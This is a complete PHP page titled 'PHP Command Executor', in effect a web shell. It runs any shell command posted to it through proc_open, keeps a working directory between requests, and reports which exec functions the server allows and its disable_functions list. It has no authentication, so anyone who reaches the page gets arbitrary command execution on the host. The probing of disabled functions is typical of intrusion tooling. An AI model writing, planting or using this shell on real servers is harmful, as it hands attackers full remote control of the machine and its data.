<?php
// Start session securely
if (session_status() === PHP_SESSION_NONE) {
    session_start([
        'cookie_secure' => isset($_SERVER['HTTPS']),
        'cookie_httponly' => true,
        'use_strict_mode' => true
    ]);
}

// Initialize function availability check
if (!isset($_SESSION['functions_checked'])) {
    $_SESSION['functions_checked'] = [
        'system' => function_exists('system') && @system('echo test') === false,
        'exec' => function_exists('exec') && @exec('echo test', $output) === false,
        'shell_exec' => function_exists('shell_exec') && @shell_exec('echo test') === null,
        'passthru' => function_exists('passthru') && @passthru('echo test') === null,
        'proc_open' => function_exists('proc_open'),
        'popen' => function_exists('popen'),
        'backticks' => function_exists('shell_exec') && @`echo test` === "test\n",
        'disabled_functions' => @ini_get('disable_functions') ?: 'None',
        'current_dir' => getcwd() // Track current directory
    ];
} elseif (!isset($_SESSION['functions_checked']['current_dir'])) {
    $_SESSION['functions_checked']['current_dir'] = getcwd();
}

// Initialize response
$response = [
    'status' => 'error',
    'message' => 'No command executed.',
    'output' => '',
    'error' => '',
    'current_dir' => $_SESSION['functions_checked']['current_dir']
];

// Handle command execution
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
    $command = trim($_POST['command']);
    
    // Handle cd commands specially
    if (preg_match('/^\s*cd\s+(.+)$/', $command, $matches)) {
        $newDir = trim($matches[1], "'\" \t\n\r\0\x0B");
        $newDir = str_replace('~', $_SERVER['HOME'] ?? '', $newDir); // Handle home directory
        
        if (@chdir($newDir)) {
            $_SESSION['functions_checked']['current_dir'] = getcwd();
            $response = [
                'status' => 'success',
                'message' => 'Directory changed',
                'output' => 'Current directory: ' . getcwd(),
                'error' => '',
                'current_dir' => getcwd()
            ];
        } else {
            $response = [
                'status' => 'error',
                'message' => 'Directory change failed',
                'output' => '',
                'error' => 'Could not change to directory: ' . $newDir . "\nCurrent directory: " . getcwd(),
                'current_dir' => $_SESSION['functions_checked']['current_dir']
            ];
        }
    } else {
        // Execute normal commands with proper directory context
        $descriptorspec = [
            0 => ["pipe", "r"],  // stdin
            1 => ["pipe", "w"],  // stdout
            2 => ["pipe", "w"]   // stderr
        ];
        
        $cwd = $_SESSION['functions_checked']['current_dir'];
        $fullCommand = 'cd ' . escapeshellarg($cwd) . ' && ' . $command . ' 2>&1';
        
        $process = proc_open(
            $fullCommand,
            $descriptorspec,
            $pipes,
            null,
            null,
            ['bypass_shell' => false]
        );
        
        if (is_resource($process)) {
            fclose($pipes[0]); // Close stdin immediately
            
            $output = stream_get_contents($pipes[1]);
            $error = stream_get_contents($pipes[2]);
            
            fclose($pipes[1]);
            fclose($pipes[2]);
            
            $returnCode = proc_close($process);
            
            $response = [
                'status' => $returnCode === 0 ? 'success' : 'error',
                'message' => $returnCode === 0 ? 'Command executed' : 'Command failed',
                'output' => $output,
                'error' => $returnCode === 0 ? '' : "Return code: $returnCode",
                'current_dir' => $cwd
            ];
        } else {
            $response = [
                'status' => 'error',
                'message' => 'Failed to execute command',
                'output' => '',
                'error' => 'Process creation failed',
                'current_dir' => $cwd
            ];
        }
    }
}

// If this is an AJAX request, return JSON
if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
    header('Content-Type: application/json');
    echo json_encode($response);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Command Executor</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
        }
        .container {
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            padding: 20px;
            width: 90%;
            max-width: 800px;
        }
        h1 {
            text-align: center;
            color: #333;
            margin-top: 0;
        }
        input[type="text"] {
            width: calc(100% - 22px);
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #45a049;
        }
        pre {
            background-color: #f8f8f8;
            padding: 15px;
            border-radius: 5px;
            font-family: Consolas, Monaco, 'Andale Mono', monospace;
            font-size: 14px;
            color: #333;
            overflow: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
            margin: 10px 0;
        }
        .output {
            background-color: #e8f5e9;
            border-left: 4px solid #4CAF50;
        }
        .error {
            background-color: #ffebee;
            border-left: 4px solid #f44336;
        }
        .function-list {
            margin: 15px 0;
        }
        .function-item {
            display: inline-block;
            margin-right: 15px;
            margin-bottom: 5px;
        }
        .function-available {
            color: #4CAF50;
        }
        .function-unavailable {
            color: #f44336;
        }
        .current-dir {
            margin: 10px 0;
            padding: 10px;
            background-color: #e3f2fd;
            border-left: 4px solid #2196F3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>PHP Command Executor</h1>
        
        <div class="current-dir">
            <strong>Current Directory:</strong> <?php echo htmlspecialchars($response['current_dir']); ?>
        </div>
        
        <form id="commandForm">
            <input type="text" id="commandInput" name="command" placeholder="Enter command (e.g., ls -la, cd /path, pwd)" required>
            <button type="submit">Execute Command</button>
        </form>

        <h2>Function Availability</h2>
        <div class="function-list">
            <?php foreach ($_SESSION['functions_checked'] as $func => $available): ?>
                <?php if (!in_array($func, ['disabled_functions', 'current_dir'])): ?>
                    <div class="function-item">
                        <strong><?php echo htmlspecialchars($func); ?>:</strong>
                        <span class="<?php echo $available ? 'function-available' : 'function-unavailable'; ?>">
                            <?php echo $available ? 'Available' : 'Disabled'; ?>
                        </span>
                    </div>
                <?php endif; ?>
            <?php endforeach; ?>
        </div>
        <div>
            <strong>Disabled functions:</strong> <?php echo htmlspecialchars($_SESSION['functions_checked']['disabled_functions']); ?>
        </div>

        <h2>Output</h2>
        <pre id="output" class="output"><?php 
            if (isset($response['output']) && !empty($response['output'])) {
                echo htmlspecialchars($response['output']);
            } else {
                echo 'No output yet. Execute a command to see results.';
            }
        ?></pre>

        <h2>Error (if any)</h2>
        <pre id="error" class="error"><?php 
            if (isset($response['error']) && !empty($response['error'])) {
                echo htmlspecialchars($response['error']);
            } else {
                echo 'No errors.';
            }
        ?></pre>
    </div>

    <script>
        document.getElementById('commandForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const command = document.getElementById('commandInput').value.trim();
            if (!command) {
                alert('Please enter a command');
                return;
            }

            // Show loading state
            const submitBtn = this.querySelector('button[type="submit"]');
            const originalText = submitBtn.textContent;
            submitBtn.textContent = 'Executing...';
            submitBtn.disabled = true;

            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                body: 'command=' + encodeURIComponent(command)
            })
            .then(response => {
                if (!response.ok) throw new Error('Network response was not ok');
                return response.json();
            })
            .then(data => {
                document.getElementById('output').textContent = data.output || 'No output';
                document.getElementById('error').textContent = data.error || 'No errors';
                
                // Update current directory display
                const dirDisplay = document.querySelector('.current-dir strong');
                if (dirDisplay) {
                    dirDisplay.nextSibling.textContent = ' ' + data.current_dir;
                }
                
                if (data.status !== 'success') {
                    document.getElementById('error').textContent = 
                        (data.message ? data.message + '\n' : '') + 
                        (data.error || '');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                document.getElementById('error').textContent = 'Failed to execute command: ' + error.message;
            })
            .finally(() => {
                submitBtn.textContent = originalText;
                submitBtn.disabled = false;
            });
        });
    </script>
</body>
</html>
